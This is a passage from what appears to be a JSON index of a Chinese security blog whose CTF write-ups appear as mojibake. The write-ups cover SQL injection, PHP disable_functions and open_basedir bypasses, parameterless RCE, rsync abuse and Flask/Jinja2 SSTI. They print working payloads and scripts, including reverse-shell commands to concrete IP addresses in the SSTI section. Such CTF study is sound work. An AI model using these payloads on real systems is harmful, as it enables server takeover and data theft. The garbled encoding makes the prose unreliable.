titleå¤„ç›´æ¥æ‹¼æ¥äº†row[â€˜titleâ€™](è¿™ä¸ªæ˜¯ä»æ•°æ®åº“å–å‡ºçš„æ•°æ®)ï¼Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚","text":"BabyblogWPäºŒæ¬¡æ³¨å…¥ç¬¬ä¸€ä¸ªç‚¹ä¸ºäºŒæ¬¡æ³¨å…¥ï¼Œé¢˜ç›®å¯ä»¥æ‹¿åˆ°æºç ï¼Œç„¶ååœ¨edit.phpå‘ç°æ³¨å…¥ç‚¹ è¿™é‡Œå‘ç°where titleå¤„ç›´æ¥æ‹¼æ¥äº†row[â€˜titleâ€™](è¿™ä¸ªæ˜¯ä»æ•°æ®åº“å–å‡ºçš„æ•°æ®)ï¼Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚ ç”±äºæœ‰safefilterçš„è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨åå…­è¿›åˆ¶å †å æ³¨å…¥ä½¿å½“å‰ç”¨æˆ·å˜æˆvip: &quot;update users set isvip=1 where username=&#39;xxx&#39;;&quot;.encode(&#39;hex&#39;) &#39;;set @t=0x************;prepare x from @t;execute x;&#39; æ­£åˆ™åŒ¹é…/eå‚æ•°çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ çœ‹åˆ°preg_replaceçš„patternå‚æ•°å¯æ§ï¼Œåœ¨phpç‰ˆæœ¬è¾ƒä½æ—¶å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œpayloadä¸º: find=/e%00(æˆªæ–­åé¢é‚£ä¸ª/)&amp;replace=phpinfo();,ä»è€Œå†™è¿›ä¸€ä¸ªshellè¿›è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ ç»•è¿‡openbasedirå…¶å®è¿™ä¸ªç‚¹æˆ‘æ²¡æ€ä¹ˆåšï¼Œçœ‹åˆ°openbasedirå’Œdisable_functionï¼Œç¬¬ä¸€ååº”æ˜¯æƒ³åŠæ³•æ‰§è¡Œæ ¹ç›®å½•ä¸‹çš„/readflagï¼Œè¿™é‡Œå­¦åˆ°ä¸€ä¸ªç»•è¿‡openbasedirçš„å¦ä¸€ä¸ªæ“ä½œï¼š glob://åè®®å’Œå…¶ä»–å‡½æ•°çš„ç»“åˆä½¿ç”¨ expå¦‚ä¸‹ï¼š 12345678&lt;?php if($b = opendir('glob:///*'))&#123; while(($file=readdir($b))!==false)&#123; echo $file.\" \"; &#125; closedir($b); &#125;?&gt; ç»•è¿‡disable_funtionè¿™é‡Œé€‰æ‹©äº†ä½¿ç”¨LD_PRELOADåŠ«æŒå‡½æ•°å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œç›´æ¥æ‰§è¡Œäº†/readflag&gt;/var/www/html/a.txt ä½†æ˜¯å‘ç°è¿™æ˜¯ä¸ªæœ‰SIGALRMä¿¡å·çš„è®¡ç®—é¢˜ï¼Œæœ¬æ¥è¿™ä¸ªé¢˜å¾ˆå¥½ç®—ï¼Œåªè¦trap &quot;&quot; 14å¿½ç•¥ä¿¡å·å¤„ç†æ…¢æ…¢ç®—å³å¯ï¼Œä½†è¿™çš„å‰ææ˜¯ä½ æœ‰ä¸ªæ¯”è¾ƒå®Œæ•´çš„shellï¼Œä½†æ˜¯buuè¿™é‡Œåˆåå¼¹ä¸äº†shellï¼Œæˆ‘ä»¬æ‰‹é‡Œçš„shellåˆæ— æ³•ç›´æ¥ç»•è¿‡disable_functionæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‰€ä»¥è¿™é‡Œå‚è€ƒ*ctfçš„ç®¡é“è§£æ³•ï¼Œå·åˆ°ä¸€ä¸ªperlè„šæœ¬(ç¨å¾®æ”¹ä¸‹) 1234567891011121314151617181920use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, '/readflag' ) or die \"open3() failed $!\";my $r;$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = eval \"$r\";print \"$r\\n\";print CHLD_IN \"$r\\n\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\"; è¿™é‡Œåˆ©ç”¨LD_PRELOADåŠ«æŒå‡½æ•°ç›´æ¥è¿è¡Œè¿™ä¸ªperlè„šæœ¬(ä¸€èˆ¬linuxæœåŠ¡å™¨éƒ½æœ‰perl)ï¼Œ æ‰§è¡Œputenvï¼Œåˆ©ç”¨error_log(â€˜â€™,1,â€™â€™,â€™â€™)èµ·æ–°è¿›ç¨‹æ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤: å¾—åˆ°flag:","categories":[],"tags":[{"name":"æŠ€æœ¯è¾£é¸¡çš„PHP","slug":"æŠ€æœ¯è¾£é¸¡çš„PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"2018_web_virink_web","slug":"2018_web_virink_web","date":"2019-12-01T16:00:00.000Z","updated":"2020-03-05T08:04:18.228Z","comments":true,"path":"2019/12/02/2018_web_virink_web/","link":"","permalink":"http://yoursite.com/2019/12/02/2018_web_virink_web/","excerpt":"å‘½ä»¤æ‰§è¡Œå†™shell","text":"å‘½ä»¤æ‰§è¡Œå†™shell 1. å‘½ä»¤æ‰§è¡Œå—é™é•¿åº¦ï¼Œå…¶å®è¿™é‡Œæ˜¯å‚è€ƒçš„hitconçš„ä¸€é“é¢˜ï¼Œåªä¸è¿‡é‚£ä¸ªè¦æ±‚æ›´ä¸¥æ ¼(5)ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨linux shçš„ç‰¹æ€§ å…ˆæŠŠè¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥æ–‡ä»¶å:&gt;eval,ç„¶åls&gt;a.php,ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ç‚¹æ˜¯shé»˜è®¤æ˜¯å­—å…¸åºæ’åºçš„ï¼Œæ‰€ä»¥åˆ©ç”¨ls -tå¼ºåˆ¶ä½¿ç”¨æ—¶é—´åºå†™å…¥ï¼Œè¿™æ ·ä¾¿å¯ä»¥å†™æˆshellã€‚ ipå’Œportæ‰«æ1.è¿™é‡Œæ‹¿åˆ°shellåæ²¡æ‰¾åˆ°flagï¼Œæ‰€ä»¥è¯´åº”è¯¥æ˜¯åœ¨å†…ç½‘é‡Œ,(ç”±äºbuuæ— æ³•è®¿é—®å¤–ç½‘ï¼Œæ‰€ä»¥æ— æ³•åå¼¹shellï¼Œè¿™æ ·å¾ˆéº»çƒ¦æ„Ÿè§‰) 2.è·å–æœåŠ¡å™¨çš„å†…ç½‘ip å…¶å®ä¸€å¼€å§‹çœ‹/etc/hostsï¼Œæœ‰ä¸ª173å¼€å¤´çš„(æˆ‘ä»¥ä¸ºå†…ç½‘ipéƒ½æ˜¯é‚£äº›10ï¼Œ172ï¼Œ192å¼€å¤´çš„ï¼Œè®¡ç½‘å¤ªèœorz)æ²¡æ³¨æ„ï¼Œæœ€ååœ¨å„æ–¹dalaoçš„å¸®åŠ©ä¸‹ï¼ŒæˆåŠŸè·å–åˆ°å†…ç½‘ä¸Šflagæœºå™¨çš„ipï¼Œè¿™é‡Œä¹Ÿä»å¤§å¸ˆå‚…é‚£é‡Œå­¦ä¹ åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶:è·¯ç”±æ ‘:/proc/net/fib_trieã€‚ 3.ç«¯å£æ‰«æ è¿™é‡Œæç¤ºçš„python3æ²¡åœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œä½¿ç”¨/usr/bin/python3å¯ä»¥æ‰§è¡Œpythonæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥ç”¨python3å»å†™è„šæœ¬æ‰«æç«¯å£(ä½¿ç”¨socketåº“) å¾—åˆ°80ï¼Œ9000ï¼Œ873ç«¯å£ php-fpmæ¼æ´å’Œrsyncæœªæˆæƒè®¿é—®æ¼æ´1.ä»på¸ˆå‚…é‚£å„¿å·çš„è„šæœ¬æ‰§è¡Œå‘½ä»¤,/usr/bin/python3 exp.py ip /www/redirect.php -c &#39;&lt;?php echo pwd(åå¼•å·)?&gt;&#39;è¿™é‡Œè¿™ä¸ªphpæ–‡ä»¶æ˜¯æ ¹æ®è·å–åŸæœåŠ¡å™¨çš„æ–‡ä»¶ä½ç½®çŒœæµ‹å‡ºçš„ã€‚ 2.rsyncæœªæˆæƒè®¿é—®æ¼æ´ Rsyncæ˜¯Linuxä¸‹ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡rsyncåè®®ã€sshåè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ã€‚å¸¸è¢«ç”¨äºåœ¨å†…ç½‘è¿›è¡Œæºä»£ç çš„åˆ†å‘åŠåŒæ­¥æ›´æ–°ï¼Œå› æ­¤ä½¿ç”¨äººç¾¤å¤šä¸ºå¼€å‘äººå‘˜ã€‚å…¶ä¸­rsyncåè®®é»˜è®¤ç›‘å¬873ç«¯å£ï¼Œè€Œä¸€èˆ¬å¼€å‘äººå‘˜å®‰å…¨æ„è¯†è–„å¼±çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†rsyncæœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®ACLæˆ–è®¿é—®å¯†ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ã€‚ æŸ¥çœ‹rsyncçš„é…ç½®æ–‡ä»¶/etc/rsyncd.confï¼Œçœ‹åˆ°srcèŠ‚ç‚¹pathè®¾ç½®åˆ°äº†/å¯ä»¥å°†/ä¸‹çš„flagå¤‡ä»½åˆ°æœ‰è¯»æƒé™çš„ä½ç½®(æ¯”å¦‚/tmp), rsync -avz ip::src/flag /tmp/ æ„Ÿå—è¿™ä¸ªé¢˜åŸæ¥å¬é˜Ÿå†…dalaoè¯´ä»¥å‰æ²¡åŠ¨æ€é¶æœºçš„æ—¶å€™flagç›´æ¥åœ¨/ä¸‹(ä¼°è®¡æ˜¯å¤§å¸ˆå‚…â€˜æ–¹ä¾¿â€™æˆ‘ä»¬åšé¢˜å§),åæ¥æ¢æˆåŠ¨æ€é¶æœºå†åšï¼Œå°±æ„Ÿè§‰è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šï¼Œgetshellè¿™ä¸€æ­¥å­¦åˆ°äº†ï¼Œç„¶åæ‹¿åˆ°ä¸€ä¸ªä¸å¤ªå¼ºçš„shellåï¼Œè€Œä¸”ç”¨æˆ·æƒé™å—é™å¤ªå¤šï¼Œ(curlä»€ä¹ˆçš„éƒ½æ²¡æœ‰.)ï¼ŒåŠŸèƒ½æ¯”è¾ƒè´«ç˜ çš„æƒ…å†µä¸‹ï¼Œå­¦ä¹ åˆ©ç”¨phpçš„file_get_contentsæ¢æµ‹å†…ç½‘ï¼Œç„¶ååˆ©ç”¨pythonï¼Œsocketå»æ‰«ç«¯å£ã€‚ä»¥åŠåæ¥çš„php-fpmæ‰§è¡Œå‘½ä»¤æ¼æ´ã€‚ é¢å¤–çš„ï¼Œè¿™é¢˜æœ¬æ¥æƒ³å°è¯•ç”¨reGeorg+proxychainså»ä»£ç†ï¼Œç„¶ånmap+msfæ‰“ï¼Œåæ¥ç¯å¢ƒå—é™(è®¿é—®é¢‘ç‡)å°±æ”¾å¼ƒäº†ï¼Œå…¶å®å¯ä»¥æ‹¿åˆ°å†…ç½‘ipåå¯ä»¥å°è¯•å»æŒ‰ç…§è¿™æ¡è·¯æ‰“ä¸€ä¸‹çš„ã€‚","categories":[],"tags":[{"name":"æŠ€æœ¯è¾£é¸¡çš„PHP","slug":"æŠ€æœ¯è¾£é¸¡çš„PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"æ— å‚æ•°rceä¸¾ä¾‹å­¦ä¹ ","slug":"æ— å‚æ•°rceä¸¾ä¾‹å­¦ä¹ ","date":"2019-09-09T10:30:35.000Z","updated":"2019-11-11T03:44:18.964Z","comments":true,"path":"2019/09/09/æ— å‚æ•°rceä¸¾ä¾‹å­¦ä¹ /","link":"","permalink":"http://yoursite.com/2019/09/09/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%BE%E4%BE%8B%E5%AD%A6%E4%B9%A0/","excerpt":"æ–‡ç« åŸç”±æœ¬æ–‡æ˜¯å› ä¸ºByteCTFä¸­çš„ä¸€é“é¢˜è€Œå­¦ä¹ åˆ°çš„ï¼Œå­¦çš„æ¯”è¾ƒæµ…ï¼Œç®€å•è®°å½•ä¸‹ã€‚ ä»€ä¹ˆæ˜¯æ— å‚æ•°rce(è¯»å–æ–‡ä»¶)è¿™ä¸ªæ¥æºäºä¸€æ®µæ­£åˆ™: 123if(&apos;;&apos;===preg_replace(&apos;[a-z]+\\((?R)?\\)&apos;,&apos;NULL&apos;,$_GET[&apos;code&apos;]))&#123; eval($_GET[&apos;code&apos;]);&#125;","text":"æ–‡ç« åŸç”±æœ¬æ–‡æ˜¯å› ä¸ºByteCTFä¸­çš„ä¸€é“é¢˜è€Œå­¦ä¹ åˆ°çš„ï¼Œå­¦çš„æ¯”è¾ƒæµ…ï¼Œç®€å•è®°å½•ä¸‹ã€‚ ä»€ä¹ˆæ˜¯æ— å‚æ•°rce(è¯»å–æ–‡ä»¶)è¿™ä¸ªæ¥æºäºä¸€æ®µæ­£åˆ™: 123if(&apos;;&apos;===preg_replace(&apos;[a-z]+\\((?R)?\\)&apos;,&apos;NULL&apos;,$_GET[&apos;code&apos;]))&#123; eval($_GET[&apos;code&apos;]);&#125; æ­£åˆ™è§£æè¿™ä¸ªæ­£åˆ™çš„é‡Œé¢çœ‹ä¸æ‡‚çš„å°±æ˜¯(?R)è¿™ä¸ªå§ï¼Œè¿™ä¸ªæ˜¯pcreæ­£åˆ™åæ¥åˆæ·»åŠ çš„ä¸€ä¸ªç‰¹æ®Šæ ‡å¿—ï¼Œè¡¨ç¤ºå»é€’å½’æ­£åˆ™åŒ¹é…è¡¨è¾¾å¼(è¿™ä¸ªå°±å¯ä»¥ç”¨æ¥åšé‚£ç§æ£€æŸ¥æ‹¬å·åŒ¹é…çš„æ­£åˆ™)ï¼Œ\\((?R)?\\),è¿™æ ·çœ‹æ¥ï¼Œè¿™æ®µphpä»£ç åªèƒ½ä¼ å‚ç±»ä¼¼a(b(c()))è¿™ç§æ ·å¼ä»£ç ï¼Œå°±ç›¸å½“äºåˆ©ç”¨æ— å‚æ•°å‡½æ•°å»getshell(æ–‡ä»¶è¯»å–)ï¼Œä¸‹é¢ä¸¾ä¾‹çš„è¿™äº›å§¿åŠ¿æ¥è‡ªé£˜é›¶å¤§ä½¬çš„åšå®¢,(orz). 1.getenv()getenv()è·å–å½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ€ä¹ˆåˆ©ç”¨è¿™ä¸ªå‘¢ï¼Ÿæ³¨æ„åˆ°å‡½æ•°array_rand()ï¼Œè¿™ä¸ªå‡½æ•°è¢«ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åè¿”å›ä¸€ä¸ªéšæœºçš„æ•°ç»„å…ƒç´ çš„ä¸‹æ ‡ï¼Œä½†æ˜¯é¸¡è‚‹çš„åœ°æ–¹åœ¨äºè¿™äº›ç¯å¢ƒå˜é‡çš„æ•°ç»„ï¼Œä¸‹æ ‡ä¸€èˆ¬æ²¡å•¥ç”¨ï¼Œä¸»è¦åœ¨å…¶å€¼ä¸Šèµ·ä½œç”¨ï¼Œä½†æ˜¯å¦ä¸€ä¸ªå‡½æ•°array_flip()ï¼Œå°±æ˜¾å¾—å¾ˆç»™åŠ›ï¼Œè¯¥å‡½æ•°å¯ä»¥æŠŠæ•°ç»„çš„ä¸‹æ ‡å’Œé”®å€¼äº’æ¢ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„æ•°ç»„å¹¶è¿”å›ï¼Œäºæ˜¯ä¾¿å¯åˆ©ç”¨array_rand(array_flip(getenv()));æ¥çˆ†ç ´ã€‚ 2.getallheaders()åœ¨apacheä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å–åˆ°httpçš„headersï¼Œè¿™æ ·æˆ‘ä»¬åªè¦åœ¨è¯·æ±‚åŒ…çš„headersé€ ä¸€ä¸ªæ¶æ„çš„æ•°æ®ï¼Œç„¶åå»åœ¨evalçš„åœ°æ–¹ç”¨getallheadersè·å–åˆ°å³å¯rceï¼Œæ¯”å¦‚è¯´ä¸‹é¢è¿™ä¸ªvar_dump(end(getallheaders()));ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹end(),next()ï¼Œå’Œcurrent(),ä»–ä»¬éƒ½æ˜¯é€šè¿‡æ•°ç»„çš„æŒ‡é’ˆæ¥è·å–æ•°ç»„çš„å…ƒç´ ï¼Œåªä¸è¿‡è·å–çš„å…·ä½“ä½ç½®ä¸åŒã€‚ 3.get_definded_vars()getallheaders()åªåœ¨apacheä¸Šæœ‰ç”¨ï¼Œå±€é™æ€§ä¹Ÿæ¯”è¾ƒå¤§ï¼Œget_definded_vars()å›æ˜¾å…¨å±€å˜é‡ï¼Œåœ¨æœåŠ¡å™¨ä¸Šï¼Œå¯èƒ½å›æ˜¾åˆ°($_GET,$_POST,$_FILES,$_COOKIE)ï¼Œæ‰€ä»¥è¿™ä¸ªåˆ©ç”¨ä¹Ÿå°±å¾ˆå¤šæ–¹å¼äº†ï¼Œgetï¼Œpostï¼Œcookieå¯èƒ½ä¼šå—åˆ°é™åˆ¶ï¼Œè¿™é‡Œä»é£˜é›¶å¤§ä½¬å­¦ä¸€ä¸ªfileçš„åˆ©ç”¨è„šæœ¬ 12345678910import requestsfrom io import BytesIOpayload=&quot;system(&apos;ls /tmp&apos;);&quot;.encode(&apos;hex&apos;)files=&#123; payload: ByteIO(&apos;xxx&apos;)&#125;r = requests.post(&apos;url&apos;/?code=&apos;eval(hex2bin(array_rand(end(get_definded_vars()))));&apos;,files=files)print r.content è¿™é‡Œçš„hexç¼–ç æ˜¯ä¸ºäº†é˜²æ­¢ç©ºæ ¼æˆ–è€…ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¢«è½¬ä¹‰æˆ–æ›¿ä»£ã€‚ 4.session_id()ç”±äºPHPSESSIDå¯ä»¥æœ‰æ•°å­—å’Œå­—æ¯ï¼Œè¿™ä¸ªä¾¿ä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚é£˜é›¶å¤§ä½¬çš„è„šæœ¬(orz)ã€‚ 12345678import requestsurl = &apos;http://localhost/?code=eval(hex2bin(session_id(session_start())));&apos;payload = &quot;echo &apos;sky cool&apos;;&quot;.encode(&apos;hex&apos;)cookies = &#123; &apos;PHPSESSID&apos;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content 5.dirname()ä¸chdir()æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œä¸Šé¢è¿™äº›éƒ½æ˜¯åŸºæœ¬æ²¡æœ‰è¿‡æ»¤æ—¶å¯ä»¥å®ç°ï¼Œä½†æ˜¯ç¨å¾®ä¸€åŠ é™åˆ¶ï¼Œæˆ‘ä»¬å¯èƒ½å°±æ— æ³•getshellï¼Œä½†æ˜¯å¦‚æœèƒ½è¯»å–æ–‡ä»¶ä¹Ÿä¸é”™ï¼Œæˆ‘ä»¬å¯ä»¥readfile(),dirname,chdir()æ¥ç»“åˆgetcwd(),scandir()ç­‰æ¥å®ç° æ„Ÿå—æ— å‚æ•°rce(æ–‡ä»¶è¯»å–)å§¿åŠ¿è‚¯å®šè¿˜æœ‰å¾ˆå¤šï¼Œä¸»è¦çœ‹å¯¹phpå‡½æ•°çš„åˆ©ç”¨ã€‚ ByteCTF BoringCode123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&apos;/data:\\/\\//i&apos;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&apos;url&apos;]))&#123; $url = $_POST[&apos;url&apos;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&apos;/baidu\\.com$/&apos;, $r[&apos;host&apos;])) &#123; $code = file_get_contents($url); if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\\((?R)?\\)/&apos;, NULL, $code)) &#123; if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123; echo &apos;bye~&apos;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; è¿™é¢˜å‰é¢åŸŸåé‚£çš„æœ¬æ¥æƒ³çš„ç»•è¿‡ï¼Œä½†æ˜¯åˆ©ç”¨0://url;baidu.comç­‰ç•¸å½¢urlç»•è¿‡å‰é¢çš„ä»¥åï¼Œfile_get_contentsè¿˜æ˜¯æ— æ³•åˆ©ç”¨,çœ‹å®Œwpï¼Œæ‰æ˜ç™½è¿™æ˜¯ByteDanceè¿™æ˜¯æ¥è°ƒæˆBaiduçš„ï¼Œç›´æ¥æ³¨å†Œä¸€ä¸ªç»“å°¾ä¸ºbaidu.comåŸŸåæ¥ç»•è¿‡æ­£åˆ™å³å¯ï¼Œè§£æåˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œç›´æ¥æ— å‚æ•°è¯»å–æ–‡ä»¶å°±å®Œäº‹äº†ï¼ˆå½“ç„¶ç»•è¿‡è¿‡æ»¤ï¼‰, è¿™é‡Œå‚è€ƒåˆ°è¿™ç¯‡åšå®¢,åˆ©ç”¨localeconv()è¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªäº§ç”Ÿâ€˜.â€™ï¼Œ(currentä½¿ç”¨posä»£æ›¿),ä¾¿å¯scandiråˆ°â€™.â€™å’Œâ€˜..â€™(next)ï¼Œå¦‚æœæˆ‘ä»¬ä»…ä»…è¯»å–å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•ï¼Œæ„Ÿè§‰å®Œå…¨å¯ä»¥ä¸å»chdirè·³ç›®å½•ï¼Œç›´æ¥è¯»å–å°±vansäº†ï¼Œä½†æ˜¯ç›®å½•å¦‚æœå±‚æ•°ç›¸å·®å¾ˆå¤šè‚¯å®šè¦å»ç”¨chdiråˆ‡æ¢å½“å‰ç›®å½•ï¼Œä½†æ˜¯è¿™é‡Œchdirè¿”å›çš„æ—¶boolå€¼ï¼Œdirname(chdir(â€˜..â€™))ï¼Œä¸å¯è¡Œï¼Œå› ä¸ºdirnameè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œçœ‹åˆ°åšå®¢ä½œè€…çš„ä¸€ç§æ–¹æ³•,åˆ©ç”¨timeå‡½æ•°å»æ¥å—boolå€¼ï¼Œç„¶ålocaltimeå‡½æ•°æ¥æ”¶timeå‡½æ•°è¿”å›å€¼ï¼Œå¹¶ä¸”å®ƒä¼šè¿”å›æ•°ç»„ï¼Œå–å‡ºç§’æ•°ï¼Œå½“å€¼ä¸º46æ—¶ï¼Œchr(46)ä¼šè½¬æ¢ä½â€™.â€™ï¼Œè¿™æ ·ä¾¿å¯ä»¥å®ç°chdiråï¼Œç”¨ä¸€ä¸ª(å‡ ä¸ª)å‡½æ•°æ¥æ”¶boolå€¼å¹¶ä¸”è¿”å›â€™.â€™ å‚è€ƒ: altman Skysec-PHP Parametric Function RCE","categories":[],"tags":[{"name":"æŠ€æœ¯è¾£é¸¡çš„PHP","slug":"æŠ€æœ¯è¾£é¸¡çš„PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"FlaskJinja2SSTI","slug":"FlaskJinja2SSTI","date":"2019-09-08T09:39:47.000Z","updated":"2019-11-11T03:45:11.117Z","comments":true,"path":"2019/09/08/FlaskJinja2SSTI/","link":"","permalink":"http://yoursite.com/2019/09/08/FlaskJinja2SSTI/","excerpt":"å‰è¨€500çº¿ä¸‹å› ä¸ºè¿™é¢˜æ²¡äº†ã€‚ã€‚ã€‚","text":"å‰è¨€500çº¿ä¸‹å› ä¸ºè¿™é¢˜æ²¡äº†ã€‚ã€‚ã€‚ æ¼æ´æ–‡ä»¶è¯»å–è¿™é‡Œæœ‰ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœæˆ‘çš„urlé‡ŒåŒ…å«ï¼Œé‚£ä¹ˆxxxä¼šè¢«æ¨¡æ¿å¼•æ“æ‰§è¡Œ ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œ ä½¿ç”¨&#39;&#39;.__class__.__mro__[2]å…ˆè·å–åˆ°objectç±»çš„å±æ€§(pythoné‡Œæ‰€æœ‰ç±»éƒ½ç»§æ‰¿äºå®ƒï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç±»äº†(&#39;&#39;.__class__.__mro__[2].__subclasses__() ))ã€‚ç„¶åæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨ç‚¹è¾ƒç›´æ¥çš„ç±»:File,æ­¤æ—¶æˆ‘ä»¬æœ‰äº†ç¬¬ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–å’Œå†™å…¥çš„exp: 12345678910- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()- &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;&lt;malicious code here&gt;&apos;)æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨Flask(Jinja2)çš„ç‰¹æ€§è¿›è¡Œrceäº†(8å¤ªæ‡‚ï¼Œç›´æ¥poå‡ºexp)1.&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\\n\\nRUNCMD = check_output\\n&apos;)2.config.from_pyfile(&apos;/tmp/owned.cfg&apos;)3.config[&apos;RUNCMD&apos;](&apos;/usr/bin/id&apos;,shell=True) è¿™é‡Œ[40]æ˜¯fileç±»ï¼Œè¿™æ˜¯ä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥ç”¨çš„ï¼Œä½†æ˜¯å¦‚æœreadè¢«banå¯èƒ½å°±éš¾å—äº†ã€‚ å‘½ä»¤æ‰§è¡Œ1.å‘½ä»¤æ‰§è¡Œçš„ç¬¬ä¸€ç§æ˜¯åˆ©ç”¨evalï¼Œæ€æ ·å»â€œåˆ°è¾¾â€eval:åˆ©ç”¨warnings.catch_warningsç±»çš„globalså±æ€§å»æ‰¾built-in function payload: 1234&apos;&apos;.__class__.__mro__[2].__subclasses__[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&apos;os&apos;).system(&apos;cmd&apos;)&apos;)&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;cmd&apos;).read()().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/139.159.140.198/2345 0&gt;&amp;1&quot;&apos;)(è¿™ä¸ªç±»æ˜¯site.Quitterï¼Œè¿˜æ²¡åˆ†æ) è¿™é‡Œå…¶å®popenä¹Ÿæœ‰readï¼Œè€Œä¸”å‘½ä»¤æ— å›æ˜¾ä¹Ÿä¼šå¾ˆéš¾å—ã€‚ shellå’Œå¸¦å¤–?å¦‚æœå‘½ä»¤æ— å›æ˜¾ï¼Œæˆ‘ä»¬è‚¯å®šå¯ä»¥åšçš„å°±æ˜¯åå¼¹shell,ä½†æ˜¯å¦‚æœæˆ‘ä»¬èƒ½æ‹¿åˆ°shellï¼Œæ‰€æœ‰é—®é¢˜éƒ½å¯ä»¥è§£å†³: å¼¹shellå†è¿™æˆ‘ä»¬è®¨è®ºçš„æƒ…å†µè‚¯å®šå°±æ˜¯bashæˆ–è€…pythonï¼Œbashå¥½è¯´ï¼Œåªè¦æˆ‘ä»¬bashå¼¹shellçš„expç”¨å‘½ä»¤æ‰§è¡Œçš„payloadæ‰§è¡Œå°±å¯ä»¥äº†(å‘ç°æ˜¯bashå¼¹shellçš„å‘½ä»¤çš„é—®é¢˜ã€‚ã€‚æ”¹å¥½å¯ä»¥æˆåŠŸæ‰§è¡Œäº†) 121.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;bash -c \\&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 